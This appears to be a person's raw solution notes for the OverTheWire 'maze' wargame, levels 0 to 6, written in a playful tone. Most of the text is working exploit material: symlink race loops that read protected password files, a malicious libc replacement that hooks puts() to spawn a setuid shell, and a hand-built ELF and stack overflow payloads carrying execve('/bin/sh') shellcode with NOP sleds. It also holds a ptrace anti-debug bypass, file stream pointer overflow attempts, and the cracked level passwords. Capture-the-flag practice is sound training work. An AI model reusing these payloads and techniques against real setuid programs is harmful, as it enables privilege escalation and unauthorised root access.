find / -perm -u=s -type f 2>/dev/null

putty -ssh -P 2225 -pw maze0 maze0@maze.labs.overthewire.org


unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register

shell ls -l /tmp/128ecf542a35ac5270a87dc740918404
shell rm /tmp/128ecf542a35ac5270a87dc740918404 && touch /tmp/128ecf542a35ac5270a87dc740918404 && chmod 777 /tmp/128ecf542a35ac5270a87dc740918404
shell ls -l /tmp/128ecf542a35ac5270a87dc740918404
shell python -c "print '\xA8'*20" > /tmp/128ecf542a35ac5270a87dc740918404
DDDDDDDDDDDDDDDDDDD
this boy right here a race condition

mkdir /tmp/naania
echo "whatup" > /tmp/naania/ex
# Then in 3 seperate terminals (or putty sessions in my case)
while [ 1 ]; do ln -sf /tmp/naania/ex /tmp/128ecf542a35ac5270a87dc740918404; ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404; done 
while [ 1 ]; do /maze/maze0 | tee -a /tmp/naania/answer; done
tail --follow /tmp/naania/answer


hashaachon


putty -ssh -P 2225 -pw hashaachon maze1@maze.labs.overthewire.org

/maze/maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory

corrupt library patch??

maze1@maze:~$ ldd /maze/maze1
        linux-gate.so.1 (0xf7fd7000)
        ./libc.so.4 => not found
        libc.so.6 => /lib32/libc.so.6 (0xf7e12000)
        /lib/ld-linux.so.2 (0xf7fd9000)

		yep making a malicious library

maze1@maze:~$ file /maze/maze1
/maze/maze1: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d00ea5ba196e0874b9c4b7e4fd72cf155bd769d0, not stripped		
		
#include <unistd.h>
#define _GNU_SOURCE

int puts(const char *str)
{
    setresuid(geteuid(), geteuid(), geteuid());
    system("/bin/bash");
    return 0;
}

cd /tmp/naania
gcc -Wall -m32 -fPIC -DPIC -fno-stack-protector -c badlib.c
ld -m elf_i386 -shared -o libc.so.4 badlib.o -ldl
/maze/maze1
maze2@maze:/tmp/naania$
cat /etc/maze_pass/maze2


fooghihahr

putty -ssh -P 2225 -pw fooghihahr maze2@maze.labs.overthewire.org

weird broken strncpy function, segfaults even with 1 character as an argument


$(python -c "print 'A'*8 + 'D'*36")

export EGG=$(python -c "print '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
run $(python -c "print 'A'*8 + 'D'*20")
x/wx $ebp+0x10
x/wx ^
x/80s ^


0xffffdeb7
'\xb7\xde\xff\xff'

$(python -c "print '\xb7\xdeAA' + 'D'*12")
nasm -f elf maze2_sol.asm; ld -m elf_i386 -s -o maze2_sol maze2_sol.o


$(python -c "print 'DDDD' + '\xb7\xde\xff\xff'*2")




I think that it might be attempting to execute at the address provided, or maybe it is just copying whatever is at the address
strace -i /maze/maze2 $(python -c "print '\x6a\xd7\x4f\xfc'")


\x50\xc8\xe4\xf7

strace -i /maze/maze2 $(python -c "print '\x50\xc8\xe4\xf7'") This gets caught and seems to be doing something with kernel space

strncpy is copying 8 bytes from the address that I specify as an argument (+ 4 to address) to [ebp+code], then attempts to call either the first four or last four bytes of ebp+code. 
ok so essentially i have 8 bytes of shellcode to do something useful (10 if my last 2 bytes happen to be \xfc\xd6, unlikely)

$(python -c "print '\x44\xc8\xe4\xf7\x90\x90\x90\x90'")


by adding nops after my 8 bytes of glory i can raise the value of the two bytes that that are at the end \xfc\xd6, so I can get at least 1 extra byte out of that, 
just 4 extra bytes already brings it to \xec\xd6
oh shit I can probably just jump to my original arguments on the stack, or even an environment variable, just as long as I write the shellcode for that

\x90\xb8\xff\xff\xde\xb6\xff\xe0
export EGG=$(python -c "print '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")
$(python -c "print '\x90\xb8\xba\xde\xff\xff\xff\xe0'")

^ that worked in gdb, nopsleds it is

export EGG=$(python -c "print '\x90'*65536 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")

 8048060:       b8 ff ff de b7          mov    $0xb7deffff,%eax
 8048065:       ff e0                   jmp    *%eax

lol this freaks strace out pretty bad
strace /maze/maze2 $(python -c "print '\x90\xb8\xba\xde\xff\xff\xff\xe0'")

beinguthok


putty -ssh -P 2225 -pw beinguthok maze3@maze.labs.overthewire.org

Looks to me like this next one was originally written in asm
this string is in there and looks like it might be somewhat important ./level4 ev0lcmds!\n
nah nvm it just prints that out, but if that is printed out it is a good sign that the program ended with a system interupt

unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register

having an argument prevents the early exit

calls system interrupt 125: capget

looks like capget is some sort of privelege escalation command

I was reading the x64 system calls, the 32 bit system call is sys_mprotect(8048000h, 97h, 7). I think that should give me rwx perms for 97h bytes of the 8048000h address space


080480cb <d1>:
 80480cb:       20 d7                   and    %dl,%bh
 80480cd:       0c cc                   or     $0xcc,%al
 80480cf:       b8 61 27 67 61          mov    $0x61672761,%eax
 80480d4:       67 f4                   addr16 hlt
 80480d6:       42                      inc    %edx
 80480d7:       10 79 1b                adc    %bh,0x1b(%ecx)
 80480da:       61                      popa
 80480db:       10 3e                   adc    %bh,(%esi)
 80480dd:       1b 70 11                sbb    0x11(%eax),%esi
 80480e0:       38 bd f1 28 05 bd       cmp    %bh,-0x42fad70f(%ebp)
 80480e6:       f3 49                   repz dec %ecx
 80480e8:       84 84 19 b5 d6 8c 13    test   %al,0x138cd6b5(%ecx,%ebx,1)
 80480ef:       78 56                   js     8048147 <d1+0x7c>
 80480f1:       34 23                   xor    $0x23,%al
 80480f3:       a3                      .byte 0xa3
 80480f4:       15                      .byte 0x15
 80480f5:       f9                      stc
 80480f6:       92                      xchg   %eax,%edx


0x080480cb <+0>:     and    bh,dl
0x080480cd <+2>:     or     al,0xcc
0x080480cf <+4>:     mov    eax,0x61672761
0x080480d4 <+9>:     addr16 hlt
0x080480d6 <+11>:    inc    edx
0x080480d7 <+12>:    adc    BYTE PTR [ecx+0x1b],bh
0x080480da <+15>:    popa
0x080480db <+16>:    adc    BYTE PTR [esi],bh
0x080480dd <+18>:    sbb    esi,DWORD PTR [eax+0x11]
0x080480e0 <+21>:    cmp    BYTE PTR [ebp-0x42fad70f],bh
0x080480e6 <+27>:    repz dec ecx
0x080480e8 <+29>:    test   BYTE PTR [ecx+ebx*1+0x138cd6b5],al
0x080480ef <+36>:    js     0x8048147
0x080480f1 <+38>:    xor    al,0x23
0x080480f3 <+40>:    mov    ds:0x92f915,eax

ida shows the code slightly differently than gdb, in gdb the force exit section is after l1 and is a part of d1

all of d1 is being xor 'd with 12345678h



here is the deobfuscated code 

Dump of assembler code for function d1:
=> 0x080480cb <+0>:     pop    eax
   0x080480cc <+1>:     cmp    DWORD PTR [eax],0x1337c0de
   0x080480d2 <+7>:     jne    0x80480ed <d1+34>
   0x080480d4 <+9>:     xor    eax,eax
   0x080480d6 <+11>:    push   eax
   0x080480d7 <+12>:    push   0x68732f2f
   0x080480dc <+17>:    push   0x6e69622f
   0x080480e1 <+22>:    mov    ebx,esp
   0x080480e3 <+24>:    push   eax
   0x080480e4 <+25>:    push   ebx
   0x080480e5 <+26>:    mov    ecx,esp
   0x080480e7 <+28>:    xor    edx,edx
   0x080480e9 <+30>:    mov    al,0xb
   0x080480eb <+32>:    int    0x80
   0x080480ed <+34>:    mov    eax,0x1
   0x080480f2 <+39>:    xor    ebx,ebx
   0x080480f4 <+41>:    inc    ebx
   0x080480f5 <+42>:    int    0x80
End of assembler dump.


$(python -c "print '\xde\xc0\x37\x13'")


deekaihiek
That was the coolest challenge i've ever done


putty -ssh -P 2225 -pw deekaihiek maze4@maze.labs.overthewire.org



unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register


reads a file, checking perms and then doing some other check before executing the file
looks like i will need to compile a unique elf and use that as the input file

#include <unistd.h>

int main()
{
        setresuid(geteuid(), geteuid(), geteuid());
        system("/bin/bash");
        return 0;
}

gcc -Wall -Wl,--section-start=.secname=0x00000000 file2check.c -o file2check

/maze/maze4 /tmp/naania/file2check

ok that was the correct compiler option, now it looks like i just need to fiddle with the file permissions 

the value that i want to change is 0x6c bytes behind the pointer to st, at 0xffffd5dc
st is at 0xffffd648
current value is 0x00002230, I need it to be 0x77,
looks like it is just the size of the file



nasm -f elf file2check.asm; ld -m elf_i386 -T link_script -s -nostdlib -o file2check file2check.o

link_script

SECTIONS {
   .text 0x00000000 :
       {
       file2check.o (.text)
       }
}


amazing https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html

BITS 32
    org 0x00000000
ehdr:
    db  0x7F, "ELF", 1, 1, 1, 0
    times 8 db  0
    dw  2
    dw  3
    dd  1
    dd  _start
    dd  phdr - $$
    dd  0
    dd  0
    dw  ehdrsize
    dw  phdrsize
    dw  1
    dw  0
    dw  0
    dw  0

ehdrsize    equ $ - ehdr

phdr:
    dd  1
    dd  0
    dd  $$
    dd  $$
    dd  filesize
    dd  filesize
    dd  5
    dd  0x1000

phdrsize    equ $ - phdr

_start:
    push byte 0x46
    pop eax
    xor ebx, ebx
    xor ecx, ecx
    int 0x80
    xor edx, edx
    push byte 0xb
    pop eax
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    push ebx
    mov ecx, esp
    int 0x80

filesize    equ $ - $$

nasm -f bin -o file2check file2check.asm
gcc -Wall -Wl,--section-start=.secname=0x00000000 file2check.c -o file2check.bak

wc -c file2check
110 file2check


maze4@maze:/tmp/naania$ xxd -l 100 file2check.bak
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 0300 3e00 0100 0000 1006 0000 0000 0000  ..>.............
00000020: 4000 0000 0000 0000 701a 0000 0000 0000  @.......p.......
00000030: 0000 0000 4000 3800 0900 4000 1f00 1e00  ....@.8...@.....
00000040: 0600 0000 0500 0000 4000 0000 0000 0000  ........@.......
00000050: 4000 0000 0000 0000 4000 0000 0000 0000  @.......@.......
00000060: f801 0000                                ....
maze4@maze:/tmp/naania$ xxd file2check
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 004d 0000 0000 0000 0000 0000 0000 0000  .M..............
00000020: 002d 0020 0000 0000 0000 0000 0001 0000  .-. ............
00000030: 0000 0000 0000 0000 0000 0000 006e 0000  .............n..
00000040: 006e 0000 0005 0000 0000 0000 006a 4658  .n...........jFX
00000050: 31db 31c9 cd80 31d2 6a0b 5852 682f 2f73  1.1...1.j.XRh//s
00000060: 6868 2f62 696e 89e3 5253 89e1 cd80       hh/bin..RS....
maze4@maze:/tmp/naania$ xxd file2check
00000000: 7f45 4c46 0201 0100 0000 0000 0000 0000  .ELF............
00000010: 004d 0000 0000 0000 0000 0000 0000 0000  .M..............
00000020: 002d 0020 0000 0000 0000 0000 0000 0000  .-. ............
00000030: 0000 0000 0000 0000 0000 0000 006e 0000  .............n..
00000040: 006e 0000 0005 0000 0000 0000 006a 4658  .n...........jFX
00000050: 31db 31c9 cd80 31d2 6a0b 5852 682f 2f73  1.1...1.j.XRh//s
00000060: 6868 2f62 696e 89e3 5253 89e1 cd80       hh/bin..RS....




BITS 32
    org 0x00000000
ehdr:
    db  0x7F, "ELF"
    db  2, 1, 1, 0, 0

    dw  0
    dw  0
    dd  0
    dd  _start
    dd  0
    dd  0
    dd  0
    dw  ehdrsize
    dw  phdrsize
    dw  0
    dw  0
    dw  0
    dw  0

ehdrsize    equ $ - ehdr

phdr:
    dd  0
    dd  0
    dd  $$
    dd  $$
    dd  filesize
    dd  filesize
    dd  5
    dd  0x0000

phdrsize    equ $ - phdr


_start:
    push byte 0x46
    pop eax
    xor ebx, ebx
    xor ecx, ecx
    int 0x80
    xor edx, edx
    push byte 0xb
    pop eax
    push edx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push edx
    push ebx
    mov ecx, esp
    int 0x80

filesize    equ $ - $$





I've finally gotten the file to be the right size and to have a header that passes inspection, now I just need the code inside to actually work

unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register


nvm just going for the race condition

while [ 1 ]; do ln -sf -T /tmp/naania/file2check /tmp/naania/file2checklnk; ln -sf -T /tmp/naania/file2check.bak /tmp/naania/file2checklnk; done 
while [ 1 ]; do /maze/maze4 /tmp/naania/file2checklnk| tee -a /tmp/naania/maze5_answer; done
tail --follow /tmp/naania/maze5_answer

well I wasted a ton of time before realizing that I could just use the race condition, but...

ishipaeroo



putty -ssh -P 2225 -pw ishipaeroo maze5@maze.labs.overthewire.org


python -c "print 'D'*8 + '\n' + 'D'*8 + '\n'" > /tmp/naania/maze5.txt
/maze/maze5 < /tmp/naania/maze5.txt

nirp
lolt


unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register
b *main+149


run < /tmp/naania/maze5.txt
y
set $eax = 0x0
c
c
c
c
c
c
c
c


ok so x is initially set to the ((low order bytes of username's addres) + i) - 41h
ecx is (i + printlol) < address of that

shell python -c "print 'DDDDDDDD' + '\n' + '\x6d\x6d\x62\x65\x69\x5f\x60\x5b' + '\n'" > /tmp/naania/maze5.txt

a0 5b 

(python -c "print 'DDDDDDDD' + '\n' + '\x6d\x6d\x62\x65\x69\x5f\x60\x5b' + '\n'"; cat -) | /maze/maze5

ok quick explanation about how I got that because I will forget and it took me way longer than it should have;
so I got to foo without much effort, program tries to stop you from using gdb with a call to ptrace because it is doing a comparison character by character between 
the correct password and your password. that is why i set eax = 0 every time i get to main+149, to bypass that check. There is a big chunk of foo that is doing a hefty chunk of work, 
but if you skip that work by putting a break point in gdb after it has run for the last time, 
you can just skip that. There is a "cmp dl, al" in a while loop that was also working with my input password somehow that seems mighty suspicious, so i just put a break point there
and changed my password to match what it was being compared against for each loop. 


epheghuoli



putty -ssh -P 2225 -pw epheghuoli maze6@maze.labs.overthewire.org

touch /tmp/naania/fil
chmod 777 /tmp/naania/fil
echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil e && xxd -s 19 /tmp/naania/fil

unset env LINES
unset env COLUMNS
set disassembly-flavor intel
alias ir=info register


/maze/maze6 /tmp/naania/fil $(python -c "print 'D'*256")
that ^ causes a segfault on fprintf

fSQBYeyunwFfH28
x/wx 0xffffd5f4
0xffffd5f4:     0x0804a008
0xffffd5f4:     0x6e6e6e6e

yep that is exactly what is happening. 

/tmp/naania/fil $(python -c "print 'D'*256 + '\x08\xa0\x04\x08'")


/tmp/naania/fil $(python -c "print 'D'*259")

0xffffd7bf   \xbf\xd7\xff\xff
/tmp/naania/fil $(python -c "print '\x90'*223 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + '\xbf\xd7\xff\xff'")


maze6@maze:~$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x01\x02\x03\x04\x05\x06\x07\x08\x09'") && xxd -s 19 /tmp/naania/fil
00000013: 2b28 292e 2f2c 2d22 0a                   +()./,-".
maze6@maze:~$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11'") && xxd -s 19 /tmp/naania/fil
00000013: 2126 2724 253a 3b0a                      !&'$%:;.
maze6@maze:~$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x12'") && xxd -s 19 /tmp/naania/fil
00000013: 380a                                     8.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x13\x14\x15\x16\x17\x18\x19\x1a\x1b'") && xxd -s 19 /tmp/naania/fil
00000013: 393e 3f3c 3d32 3330 310a                 9>?<=2301.
maze6@maze:~$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x1c\x1d\x1e\x1f\x21\x22\x23\x24'") && xxd -s 19 /tmp/naania/fil
00000013: 3637 3435 0b08 090e 0a                   6745.....
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x25\x26\x27\x28\x29\x2c\x2d'") && xxd -s 19 /tmp/naania/fil
00000013: 0f0c 0d02 0301 0607 0a                   .........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x2e\x2f\x30\x31\x32\x33\x34\x35\x36'") && xxd -s 19 /tmp/naania/fil
00000013: 0405 1a1b 1819 1e1f 1c0a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f'") && xxd -s 19 /tmp/naania/fil
00000013: 1d12 1310 1116 1714 150a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x40\x41\x42\x43\x44\x45\x46\x47\x48'") && xxd -s 19 /tmp/naania/fil
00000013: 6a6b 6869 6e6f 6c6d 620a                 jkhinolmb.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51'") && xxd -s 19 /tmp/naania/fil
00000013: 6360 6166 6764 657a 7b0a                 c`afgdez{.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x52\x53\x54\x55\x56\x57\x58\x59\x5a'") && xxd -s 19 /tmp/naania/fil
00000013: 7879 7e7f 7c7d 7273 700a                 xy~.|}rsp.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63'") && xxd -s 19 /tmp/naania/fil
00000013: 7176 7774 754a 4b48 490a                 qvwtuJKHI.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c'") && xxd -s 19 /tmp/naania/fil
00000013: 4e4f 4c4d 4243 4041 460a                 NOLMBC@AF.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75'") && xxd -s 19 /tmp/naania/fil
00000013: 4744 455a 5b58 595e 5f0a                 GDEZ[XY^_.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e'") && xxd -s 19 /tmp/naania/fil
00000013: 5c5d 5253 5051 5657 540a                 \]RSPQVWT.
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x7f\x80\x81\x82\x83\x84\x85\x86\x87'") && xxd -s 19 /tmp/naania/fil
00000013: 55aa aba8 a9ae afac ad0a                 U.........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90'") && xxd -s 19 /tmp/naania/fil
00000013: a2a3 a0a1 a6a7 a4a5 ba0a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x91\x92\x93\x94\x95\x96\x97\x98\x99'") && xxd -s 19 /tmp/naania/fil
00000013: bbb8 b9be bfbc bdb2 b30a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2'") && xxd -s 19 /tmp/naania/fil
00000013: b0b1 b6b7 b4b5 8a8b 880a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab'") && xxd -s 19 /tmp/naania/fil
00000013: 898e 8f8c 8d82 8380 810a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4'") && xxd -s 19 /tmp/naania/fil
00000013: 8687 8485 9a9b 9899 9e0a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd'") && xxd -s 19 /tmp/naania/fil
00000013: 9f9c 9d92 9390 9196 970a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6'") && xxd -s 19 /tmp/naania/fil
00000013: 9495 eaeb e8e9 eeef ec0a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf'") && xxd -s 19 /tmp/naania/fil
00000013: ede2 e3e0 e1e6 e7e4 e50a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8'") && xxd -s 19 /tmp/naania/fil
00000013: fafb f8f9 feff fcfd f20a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1'") && xxd -s 19 /tmp/naania/fil
00000013: f3f0 f1f6 f7f4 f5ca cb0a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea'") && xxd -s 19 /tmp/naania/fil
00000013: c8c9 cecf cccd c2c3 c00a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3'") && xxd -s 19 /tmp/naania/fil
00000013: c1c6 c7c4 c5da dbd8 d90a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc'") && xxd -s 19 /tmp/naania/fil
00000013: dedf dcdd d2d3 d0d1 d60a                 ..........
maze6@maze:/tmp/naania$ echo "" > /tmp/naania/fil && /maze/maze6 /tmp/naania/fil $(python -c "print '\xfd\xfe\xff'") && xxd -s 19 /tmp/naania/fil
00000013: d7d4 d50a                                ....

\x46\xfd\xd5\xd5
/tmp/naania/fil $(python -c "print '\xba'*223 + '\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80' + '\x46\xfd\xd5\xd5'")

should have seen this earlier, but there isn't a ret statement, so I cannot really be controlling the eip after return if there is no return...

0x0804a008  \x22\x8a\x2e\x22
x/wx 0xffffd5f4
this allows me to overwrite the file pointer with its actual value
/tmp/naania/fil $(python -c "print 'D'*256 + '\x22\x8a\x2e\x22'")


/tmp/naania/fil $(python -c "print 'D'*256 + '\x22\x8a\x2e\x22' + 'D'*12 + 'AAAA' ")



stick with me here... 
$1 = (struct _IO_FILE *) 0xf7fc5d60 <_IO_2_1_stdout_>
\x60\x5d\xfc\xf7
\x4a\x77\xd6\xdd
/tmp/naania/fil $(python -c "print 'D'*256 + '\x4a\x77\xd6\xdd'")

Everything is indeed a file...

$3 = (struct _IO_FILE *) 0xf7fc5cc0 <_IO_2_1_stderr_>
\xc0\x5c\xfc\xf7
\xe9\x76\xd6\xdd


$4 = (struct _IO_FILE *) 0xf7fc55a0 <_IO_2_1_stdin_>
\xa0\x55\xfc\xf7
\x8a\x7f\xd6\xdd

/tmp/naania/fil $(python -c "print 'D'*256 + '\xe9\x76\xd6\xdd'")




SO pretty much every description that I have found about this has been in broken english, actually a different language, or has just jumped past the theory of it, 
but it looks like "file stream pointer overflow" is what this is called. 
I guess the idea is that I overwrite part of a vtable, so when the part that I have overwritten has a call made to it it will point to something else, like in narnia or behemoth
when I overwrote the address of puts with system in the plt. So in theory I could overwrite stdout? neat

https://1ce0ear.github.io/2017/09/25/File-Stream-Pointer-Overflow1/
http://www.ouah.org/fsp-overflows.txt

0xffffd614
\x14\xd6\xff\xff
\x3a\xfc\xd5\xd5
/tmp/naania/fil $(python -c "print 'D'*256 + '\x4a\x77\xd6\xdd' + 'D'*12 + '\x32\xfc\xd5\xd5'")


0xffffd840
\x40\xd8\xff\xff
\x6a\xf2\xd5\xd5
/tmp/naania/fil $(python -c "print 'D'*108 + '\x84\x20\xad\xfb\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x88\x55\xfc\xf7\x88\x44\x44\x44\x44\x44\x44\x44\xff\xff\xff\xff\x44\x44\x44\x44\x70\x68\xfc\xf7\xff\xff\xff\xff\xff\xff\xff\xff\x44\x44\x44\x44\xe0\x54\xfc\xf7\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x60\x39\xfc\xf7' + '\x6a\xf2\xd5\xd5'")



import struct
class memfrob_lookup_table:
    def __init__(self):
        self.__generate_lookup_table()

    def __generate_lookup_table(self):
        self.lookup_map = dict()
        for i in range(0,256):
            key = hex(i ^ 42)[2:]
            value = hex(i)[2:]
            if len(key) == 1:
                key = "0" + key
            if len(value) == 1:
                value = "0" + value
            self.lookup_map[key] = value
    
    def __get_bytes(self, hex):
        l = len(hex)
        for i in range(0, l, 2):
            yield hex[i:min(i + 2, l)]

    def lookup_word(self, value, printable=False):
        hex = struct.pack("I", value).hex()
        result = list()
        for i in self.__get_bytes(hex):
            result.append(self.lookup_map[i])
        if printable:
            print("{:s}{:s}".format("\\x", "\\x".join(result)))
        return result

    def lookup_single_byte(self, byte_value, printable=False):
        """This is necessary because some part of lookup defaults to 4 bytes
        and the first 3 are just assumed to be 00."""
        result = self.lookup_word(byte_value)[0]
        if printable:
            print("{:s}{:s}".format("\\x", result))
        return result



stdout_fd = [0x84, 0x20, 0xad, 0xfb, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa0, 0x55, 0xfc, 0xf7, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x70, 0x68, 0xfc, 0xf7, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0xe0, 0x54, 0xfc, 0xf7, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x39, 0xfc, 0xf7, 0xc0, 0x5c, 0xfc, 0xf7, 0x60, 0x5d, 0xfc, 0xf7]
k = memfrob_lookup_table()
altered_stdout_fd = [k.lookup_single_byte(i) for i in stdout_fd]
I got tired of doing the lookup by hand

